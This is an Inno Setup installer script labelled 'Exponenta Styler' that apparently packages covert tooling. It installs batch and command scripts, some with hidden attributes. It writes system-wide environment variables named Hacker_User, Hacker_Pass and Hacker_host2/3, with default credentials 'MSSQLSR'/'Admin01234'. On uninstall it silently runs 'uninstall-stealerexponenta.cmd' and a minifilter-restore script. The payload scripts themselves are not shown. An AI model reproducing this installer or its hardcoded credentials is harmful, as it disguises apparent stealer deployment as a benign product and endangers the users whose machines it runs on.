; -- Exponenta.iss --
;
; This script Create Installator and deinstallator of the
; Exponenta Styler

[Setup]
AppName=Exponenta Styler Main Files
AppVersion=1.6.0
AllowRootDirectory=yes
AllowCancelDuringInstall=yes
ArchitecturesAllowed=x86 x64
Compression=lzma2/max
DefaultDirName={%PUB1|c:\pub1}
MinVersion=6.0.6001
SetupLogging=yes
UsePreviousAppDir=yes
DisableStartupPrompt=yes
Output=no
OutputDir=d:\Download
OutputBaseFilename=ExponentaStylerSetupFTP

[Files]
Source: "*.cmd"; DestDir: "{app}\Util"; Flags: recursesubdirs uninsremovereadonly uninsrestartdelete restartreplace
Source: "*.bat"; DestDir: "{app}\Util"; Flags: recursesubdirs uninsremovereadonly uninsrestartdelete restartreplace
;Source: "*.reg"; DestDir: "{app}\Util"; Attribs: hidden; Flags: recursesubdirs uninsremovereadonly uninsrestartdelete restartreplace
Source: "*.xml"; DestDir: "{app}\Util"; Attribs: hidden; Flags: recursesubdirs uninsremovereadonly uninsrestartdelete restartreplace
;Source: descript.ion; DestDir: "{app}\Util"; Attribs: hidden; Flags: recursesubdirs uninsremovereadonly uninsrestartdelete restartreplace
;Source: "*.md"; DestDir: "{app}\Util"; Flags: recursesubdirs uninsremovereadonly uninsrestartdelete restartreplace

[Registry]

Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_User"; ValueData: "{%Hacker_User|MSSQLSR}"
Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_Pass"; ValueData: "{%Hacker_Pass|Admin01234}"
Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_host2"; ValueData: "{%Hacker_host2}"
Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_host3"; ValueData: "{%Hacker_host3}"

[UninstallRun]

Filename: {app}\Util\uninstall-stealerexponenta.cmd; Flags: runhidden
Filename: {app}\Util\minifilters-interface-restore.cmd; Flags: runhidden

